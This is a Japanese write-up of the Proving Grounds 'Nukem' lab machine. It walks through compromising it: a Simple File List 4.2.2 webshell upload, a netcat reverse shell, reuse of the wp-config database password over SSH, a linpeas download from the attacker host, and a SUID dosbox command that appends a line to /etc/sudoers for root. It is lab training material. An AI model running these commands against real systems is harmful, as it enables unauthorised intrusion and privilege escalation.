+++
title = "Proving Grounds Practice - Nukem Writeup"
date = "2026-10-17"
description = "WordPressプラグイン Simple File List の脆弱性を利用してWebシェルを取得し、資格情報の使い回しとSUIDバイナリ(dosbox)の悪用によりrootを取得"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[Nukem]", "[WordPress]", "[Simple File List]", "[Credential Reuse]", "[SUID]", "[dosbox]", "[easy]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Nukem |
| OS | Linux |
| Target IP | 192.168.178.105 |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対して全ポートスキャンとデフォルトスクリプト・バージョン検出を実行する。

```bash
nmap -sC -sV -p- 192.168.178.105
```

スキャン結果から、以下のポートが開いていることを確認した。

```text
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.3 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
3306/tcp  open  mysql       MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http        Werkzeug httpd 1.0.1 (Python 3.8.5)
13000/tcp open  http        nginx 1.18.0
36445/tcp open  netbios-ssn Samba smbd 4
```

ポート80ではWordPress 5.5.1が稼働しており(`Retro Gamming – Just another WordPress site`)、ポート5000ではFlask製と思われるアプリケーション、ポート13000ではログイン画面(`Login V14`)が確認できた。

今回はWordPressが稼働するポート80を起点に調査を進める。

---

## Enumeration

### Directory Enumeration

各Webサービスに対してディレクトリ列挙を実施する。

```bash
gobuster dir -u http://192.168.178.105/ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://192.168.178.105:13000 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://192.168.178.105:5000/ -w /usr/share/wordlists/dirb/common.txt
```

ポート80では`wp-admin`や`wp-content`などWordPress特有のパスが、ポート13000では静的なログインページのアセットが、ポート5000では`employees`・`tracks`といったエンドポイント(いずれも500エラー)が確認できた。

### WPScan

WordPressの詳細情報とプラグインを調査する。

```bash
wpscan --url http://192.168.178.105/ -e ap,at,u
```

結果、以下のプラグインが稼働していることが判明した。

- `simple-file-list` v4.2.2
- `tutor` v1.5.3
- `akismet` v4.1.6
- `relative-url` v0.1.7

中でも`simple-file-list` v4.2.2は既知の脆弱性が公開されているバージョンであり、重点的に調査する。

### Exploit-DB / SearchSploit Research

```bash
searchsploit simple file list
```

```text
Simple File List WordPress Plugin 4.2.2 - File Upload to RCE    | multiple/webapps/52371.py
WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload | php/webapps/48979.py
WordPress Plugin Simple File List 4.2.2 - Remote Code Execution | php/webapps/48449.py
```

[Exploit-DB 48979](https://www.exploit-db.com/exploits/48979)を利用し、認証不要の任意ファイルアップロードによるWebシェル設置を試みる。

---

## Exploitation

### Simple File List Arbitrary File Upload

取得したエクスプロイトを実行する。

```bash
python3 48979.py http://192.168.178.105
```

```text
[ ] File 8815.png generated with password: 7bacd7ec0928d21aa5932664307162a0
[ ] File uploaded at http://192.168.178.105/wp-content/uploads/simple-file-list/8815.png
[ ] File moved to http://192.168.178.105/wp-content/uploads/simple-file-list/8815.php
[+] Exploit seem to work.
```

画像ファイルとしてアップロードした後、拡張子を`.php`にリネームすることでWebシェルとして設置に成功している。

### Reverse Connection

攻撃者側で接続を待ち受ける。

```bash
nc -lvnp 80
```

設置したWebシェル経由でコマンドを実行し、リバースシェルを取得した。

```text
listening on [any] 80 ...
connect to [192.168.45.169] from (UNKNOWN) [192.168.178.105] 33106
[http@nukem simple-file-list]$
```

この時点では`http`ユーザーの権限でシェルを取得している。

### Credential Harvesting (wp-config.php)

WordPressの設定ファイルからデータベース資格情報を取得する。

```bash
cat wp-config.php
```

```text
define( 'DB_USER', 'commander' );
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
```

`commander`というユーザー名とパスワードが確認できた。このパスワードがOS側のユーザーアカウントでも使い回されている可能性を考え、SSHでの認証を試みる。

### SSH Login (Credential Reuse)

```bash
ssh commander@192.168.178.105
```

`wp-config.php`から取得したパスワードでSSHログインを試みたところ、認証に成功した。

```text
[commander@nukem ~]$ whoami
commander
[commander@nukem ~]$ ls
Desktop  local.txt  python_rest_flask
```

データベースの資格情報がOSログインユーザーと共有されていたことが、初期侵入後の権限奪取につながった。

---

## Privilege Escalation

### LinPEAS

権限昇格の糸口を探るため、LinPEASを転送して実行する。

```bash
wget http://192.168.45.169:8000/linpeas.sh
```

SUIDが付与されたバイナリの一覧から、通常見られない`dosbox`が検出された。

```text
-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox
```

`dosbox`はDOSエミュレータであり、SUIDが付与されている場合、内部コマンドの`mount`機能を利用して任意のファイルを書き換えることができる(GTFOBinsに掲載されている既知の手法)。

### Abusing SUID dosbox

`dosbox`のmount機能でルートディレクトリをマウントし、内部コマンドの`echo`機能を利用して`/etc/sudoers`に行を追記する。

```bash
LFILE='/etc/sudoers'
/usr/bin/dosbox -c 'mount c /' -c "echo commander    ALL=(ALL:ALL) ALL >c:$LFILE" -c exit
```

`dosbox`がroot権限(SUID)で動作しているため、本来書き込み権限のない`/etc/sudoers`に対して、`commander`ユーザーに無制限の`sudo`権限を付与する行を追記することができた。

### Privilege Confirmation

```bash
sudo -l
```

```text
User commander may run the following commands on nukem:
    (ALL : ALL) ALL
```

`sudoers`への追記が反映され、`commander`が任意のコマンドをroot権限で実行できる状態になったことを確認した。

```bash
sudo su -
```

```text
[root@nukem ~]#
```

`root`シェルの取得に成功した。

---

## Summary

WordPress上で稼働していた脆弱なプラグイン`Simple File List 4.2.2`を悪用し、認証不要の任意ファイルアップロードによってWebシェルを設置、`http`ユーザーとしてのリバースシェルを取得した。

その後、`wp-config.php`に記載されていたデータベース資格情報がOSユーザー`commander`のSSHパスワードとして使い回されていたことを突き止め、SSH経由で正規ユーザーへ昇格した。

最終的に、SUIDが付与された`dosbox`のファイル書き換え機能を悪用して`/etc/sudoers`を改ざんし、`sudo su -`によってroot権限を取得した。

攻略の流れは以下のとおり。

1. Nmapによる全ポートスキャンとサービス列挙
2. 各Webサービスに対するディレクトリ列挙とWPScanによるプラグイン調査
3. `Simple File List 4.2.2`の脆弱性情報をExploit-DB/SearchSploitで特定
4. 公開エクスプロイト(48979.py)によるWebシェル設置とリバースシェル取得
5. `wp-config.php`からのDB資格情報取得
6. 資格情報の使い回しによるSSHログイン(commander)
7. LinPEASによるSUIDバイナリの洗い出し
8. SUID `dosbox`を悪用した`/etc/sudoers`改ざん
9. `sudo su -`によるroot権限の取得

今回のポイントは、**プラグインの脆弱性による初期侵入に加え、資格情報の使い回しと非標準SUIDバイナリ(dosbox)の悪用という2段階の権限昇格経路を辿ったこと**である。
